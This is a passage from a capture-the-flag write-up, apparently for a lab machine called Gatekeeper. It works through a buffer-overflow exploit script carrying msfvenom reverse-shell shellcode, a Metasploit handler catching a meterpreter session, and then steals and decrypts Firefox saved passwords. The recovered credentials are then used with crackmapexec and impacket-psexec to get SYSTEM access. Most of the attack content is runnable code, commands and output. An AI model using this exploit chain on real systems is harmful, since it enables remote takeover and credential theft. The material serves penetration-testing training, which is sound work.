buf += b"\xf3\xa3\xca\xb9\x2b\x0b\x9a\x47\xcc\x6b\xb2\x83"
buf += b"\x98\x3b\xac\x22\xa1\xd0\x2c\xca\x74\x4c\x27\x5c"
buf += b"\x7d\x81\x2b\x49\xe9\xa3\x53\x60\x2b\x2a\xb5\xd2"
buf += b"\xfb\x7c\x6a\x93\xab\x3c\xda\x7b\xa6\xb3\x05\x9b"
buf += b"\xc9\x1e\x2e\x36\x26\xf6\x06\xaf\xdf\x53\xdc\x4e"
buf += b"\x1f\x4e\x98\x51\xab\x7a\x5c\x1f\x5c\x0f\x4e\x48"
buf += b"\x3b\xef\x8e\x89\xae\xef\xe4\x8d\x78\xb8\x90\x8f"
buf += b"\x5d\x8e\x3e\x6f\x88\x8d\x39\x8f\x4d\xa7\x32\xa6"
buf += b"\xdb\x87\x2c\xc7\x0b\x07\xad\x91\x41\x07\xc5\x45"
buf += b"\x32\x54\xf0\x89\xef\xc9\xa9\x1f\x10\xbb\x1e\xb7"
buf += b"\x78\x41\x78\xff\x26\xba\xaf\x83\x21\x44\x2d\xac"
buf += b"\x89\x2c\xcd\xec\x29\xac\xa7\xec\x79\xc4\x3c\xc2"
buf += b"\x76\x24\xbc\xc9\xde\x2c\x37\x9c\xad\xcd\x48\xb5"
buf += b"\x70\x53\x48\x3a\xa9\x64\x33\x33\x4e\x85\xc4\x5d"
buf += b"\x2b\x86\xc4\x61\x4d\xbb\x12\x58\x3b\xfa\xa6\xdf"
buf += b"\x34\x49\x8a\x76\xdf\xb1\x98\x89\xca"



# 0x080414c3
buffer = b"A" * 146 + b"\xc3\x14\x04\x08" + b"\x90" * 16 + buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.10.64", 31337))
    s.send((buffer + b"\r\n"))
    s.close()

except Exception as e:
    print("Error:", e)
    sys.exit()

```

Using `metasploit` to catch the reverse shell connection from our local windows machine. 

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.10.72
LHOST => 192.168.10.72
msf6 exploit(multi/handler) > set LPORT 4545
LPORT => 4545
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.10.72:4545 
```

We did get a connection from our local windows machine which had the gatekeeper application running. Although we get some errors on the session, that might be because of Firewall protection which i had forgotten to turn off. 

```
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type   Information  Connection
  --  ----  ----   -----------  ----------
  1         shell               192.168.10.72:4545 -> 192.168.10.64:49887 (192.168.10.64)
  2         shell               192.168.10.72:4545 -> 192.168.10.64:49888 (192.168.10.64)
  3         shell               192.168.10.72:4545 -> 192.168.10.64:49889 (192.168.10.64)
  4         shell               192.168.10.72:4545 -> 192.168.10.64:49890 (192.168.10.64)
  5         shell               192.168.10.72:4545 -> 192.168.10.64:49891 (192.168.10.64)
  6         shell               192.168.10.72:4545 -> 192.168.10.64:49892 (192.168.10.64)
  7         shell               192.168.10.72:4545 -> 192.168.10.64:49893 (192.168.10.64)
  8         shell               192.168.10.72:4545 -> 192.168.10.64:49894 (192.168.10.64)
  9         shell               192.168.10.72:4545 -> 192.168.10.64:49895 (192.168.10.64)
  10        shell               192.168.10.72:4545 -> 192.168.10.64:49896 (192.168.10.64)

msf6 exploit(multi/handler) > sessions -i 10
[*] Starting interaction with 10...

[*] 192.168.10.64 - Command shell session 10 closed.
```
## Remote Exploit

Since we got the connection back from our local windows machine running the gatekeeper application, let try it now on the remote machine.

Using the `msfvenom` tool to generate shellcode for the remote machine, we keep the LHOST value of our VPN IP address.

```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.28.213 LPORT=4545 -b "\x00\x0A" -f python -e x86/shikata_ga_nai
```

Now copying the output to our `python` exploit script. Don't forget to change the the IP address to remote machine to which we will sending our shellcode.

```
#!/bin/python

import sys
import socket


buf =  b""
buf += b"\xb8\xae\xde\x40\xde\xdb\xd7\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x59\x83\xc3\x04\x31\x43\x10\x03\x43"
buf += b"\x10\x4c\x2b\xbc\x36\x1f\xd4\x3d\xc7\x7f\xe4\xef"
buf += b"\x4e\x9a\x62\x9b\x03\x54\xe0\xc9\xaf\x1f\xa4\xf9"
buf += b"\x24\x6d\x61\x0d\x8c\xdb\x57\x20\x0d\xea\x57\xee"
buf += b"\xcd\x6d\x24\xed\x01\x4d\x15\x3e\x54\x8c\x52\x88"
buf += b"\x12\x61\x0e\x5c\x56\x2f\xbf\xe9\x2a\xf3\xbe\x3d"
buf += b"\x21\x4b\xb9\x38\xf6\x3f\x75\x42\x27\xef\x0e\x0c"
buf += b"\xdf\x84\x49\xad\xde\x49\xec\x64\x94\x51\xa6\xfd"
buf += b"\x61\x22\x09\xfd\x8b\xe2\x5b\xc1\x4d\xc5\x91\x6d"
buf += b"\x4c\x1e\x91\x8d\x3a\x54\xe1\x30\x3d\xaf\x9b\xee"
buf += b"\xc8\x2f\x3b\x64\x6a\x8b\xbd\xa9\xed\x58\xb1\x06"
buf += b"\x79\x06\xd6\x99\xae\x3d\xe2\x12\x51\x91\x62\x60"
buf += b"\x76\x35\x2e\x32\x17\x6c\x8a\x95\x28\x6e\x72\x49"
buf += b"\x8d\xe5\x91\x9c\xb1\x06\x6a\xa1\xef\x90\xa6\x6c"
buf += b"\x10\x60\xa1\xe7\x63\x52\x6e\x5c\xec\xde\xe7\x7a"
buf += b"\xeb\x57\xef\x7c\x23\xdf\x60\x83\xc4\x1f\xa8\x40"
buf += b"\x90\x4f\xc2\x61\x99\x04\x12\x8d\x4c\xb0\x18\x19"
buf += b"\x65\x55\x01\x0c\x11\x57\x39\xbf\x23\xde\xdf\xef"
buf += b"\xf3\xb0\x4f\x50\xa4\x70\x20\x38\xae\x7f\x1f\x58"
buf += b"\xd1\xaa\x08\xf3\x3e\x02\x60\x6c\xa6\x0f\xfa\x0d"
buf += b"\x27\x9a\x86\x0e\xa3\x2e\x76\xc0\x44\x5b\x64\x35"
buf += b"\x33\xa3\x74\xc6\xd6\xa3\x1e\xc2\x70\xf4\xb6\xc8"
buf += b"\xa5\x32\x19\x32\x80\x41\x5e\xcc\x55\x73\x14\xfb"
buf += b"\xc3\x3b\x42\x04\x04\xbb\x92\x52\x4e\xbb\xfa\x02"
buf += b"\x2a\xe8\x1f\x4d\xe7\x9d\xb3\xd8\x08\xf7\x60\x4a"
buf += b"\x61\xf5\x5f\xbc\x2e\x06\x8a\xbe\x29\xf8\x48\xe9"
buf += b"\x91\x90\xb2\xa9\x21\x60\xd9\x29\x72\x08\x16\x05"
buf += b"\x7d\xf8\xd7\x8c\xd6\x90\x52\x41\x94\x01\x62\x48"
buf += b"\x78\x9f\x63\x7f\xa1\x10\x19\xf0\x56\xd1\xde\x18"
buf += b"\x33\xd2\xde\x24\x45\xef\x08\x1d\x33\x2e\x89\x1a"
buf += b"\x4c\x05\xac\x0b\xc7\x65\xe2\x4c\xc2"



# 0x080414c3
buffer = b"A" * 146 + b"\xc3\x14\x04\x08" + b"\x90" * 16 + buf

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.10.233.158", 31337))
    s.send((buffer + b"\r\n"))
    s.close()

except Exception as e:
    print("Error:", e)
    sys.exit()
```

Using the `metasploit` handler to listen to the connection from the remote machine. After running the exploit, we will get the `meterpreter` session as the **natbat** user from the remote machine.

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.17.28.213
LHOST => 10.17.28.213
msf6 exploit(multi/handler) > set LPORT 4545
LPORT => 4545
msf6 exploit(multi/handler) > set payload payload/windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.17.28.213:4545 
[*] Sending stage (176198 bytes) to 10.10.233.158
[*] Meterpreter session 1 opened (10.17.28.213:4545 -> 10.10.233.158:49217) at 2024-04-19 14:31:46 +0545

meterpreter > getuid
Server username: GATEKEEPER\natbat

```

We will find the user flag on the Desktop Directory of the **natbat** user. 
### Privilege Escalation

Since this only user level access, we will now need to escalate our privilege to Administrator level. So let's get our hands dirty...

In the `meterpreter` session, run the module `post/windows/gather/enum_applications` to see which applications are installed on the remote machine. 

```
meterpreter > run post/windows/gather/enum_applications 

[*] Enumerating applications installed on GATEKEEPER

Installed Applications
======================

 Name                                                                Version
 ----                                                                -------
 Amazon SSM Agent                                                    2.3.842.0
 Amazon SSM Agent                                                    2.3.842.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 EC2ConfigService                                                    4.9.4222.0
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
 Mozilla Firefox 75.0 (x86 en-US)                                    75.0


[+] Results stored in: /home/paincakes/.msf4/loot/20240419143845_default_10.10.233.158_host.application_093157.txt
meterpreter > 

```

Only the Firefox application seems to interesting from the list of applications, because sometimes user can save their credentials in the password manager, which can extracted.

Use the `/post/multi/gather/firefox_creds` to extract the credentials stored in the firefox application. 

```
meterpreter > run post/multi/gather/firefox_creds 

[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /home/paincakes/.msf4/loot/20240419144000_default_10.10.233.158_ff.ljfn812a.cert_556607.bin
[+] Downloaded cookies.sqlite: /home/paincakes/.msf4/loot/20240419144003_default_10.10.233.158_ff.ljfn812a.cook_804858.bin
[+] Downloaded key4.db: /home/paincakes/.msf4/loot/20240419144007_default_10.10.233.158_ff.ljfn812a.key4_098273.bin
[+] Downloaded logins.json: /home/paincakes/.msf4/loot/20240419144010_default_10.10.233.158_ff.ljfn812a.logi_241349.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default

```

We downloaded three files, from which we will be essential for extracting the credentials. By default it will be in **loot** folder of `metasploit`, you can copy those files to our own created directory, or use directly from there. 

In whatever directory you used, we will need to rename the files to their previous names, when `metasploit` extracts the file it will rename files according to the date, you can see the previous names in the download logs, so just rename all those three files to their previous names.

```
# mv 20240419144000_default_10.10.233.158_ff.ljfn812a.cert_556607.bin cert9.db

# mv 20240419144003_default_10.10.233.158_ff.ljfn812a.cook_804858.bin cookies.sqlite              

# mv 20240419144007_default_10.10.233.158_ff.ljfn812a.key4_098273.bin key4.db       
# mv 20240419144010_default_10.10.233.158_ff.ljfn812a.logi_241349.bin logins.json

```

Download the firefox decrypt tool from [here](https://github.com/unode/firefox_decrypt), we will use this tool to extract the credentials from the files we downloaded from `metasploit`.

```
# python3 firefox_decrypt.py loot 
2024-04-19 14:49:13,488 - WARNING - profile.ini not found in loot
2024-04-19 14:49:13,488 - WARNING - Continuing and assuming 'loot' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'

```

We got the credentials of user **mayor**, lets try logging into the SMB service.

```
# crackmapexec smb 10.10.233.158 -u 'mayor' -p '8CL7O1N78MdrCIsV' --shares
SMB         10.10.233.158   445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
SMB         10.10.233.158   445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N78MdrCIsV (Pwn3d!)
SMB         10.10.233.158   445    GATEKEEPER       [+] Enumerated shares
SMB         10.10.233.158   445    GATEKEEPER       Share           Permissions     Remark
SMB         10.10.233.158   445    GATEKEEPER       -----           -----------     ------
SMB         10.10.233.158   445    GATEKEEPER       ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.233.158   445    GATEKEEPER       C$              READ,WRITE      Default share
SMB         10.10.233.158   445    GATEKEEPER       IPC$                            Remote IPC
SMB         10.10.233.158   445    GATEKEEPER       Users           READ,WRITE 
```

It worked!! not only did it work, we can see that it also shows **Pwn3d!**, which means this is user has administrator access on the machine.

Now we will use `impact-psexec` tool to spawn the administrator level shell using the  credentials of the user **mayor**

```
# impacket-psexec gatekeepr/mayor:8CL7O1N78MdrCIsV@10.10.233.158                                                        
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.233.158.....
[*] Found writable share ADMIN$
[*] Uploading file SXxrTZen.exe
[*] Opening SVCManager on 10.10.233.158.....
[*] Creating service AxVM on 10.10.233.158.....
[*] Starting service AxVM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 

```

We got the SYSTEM level access on the remote machine!! 

We will find the root flag on the Desktop Directory of the **mayor** user.

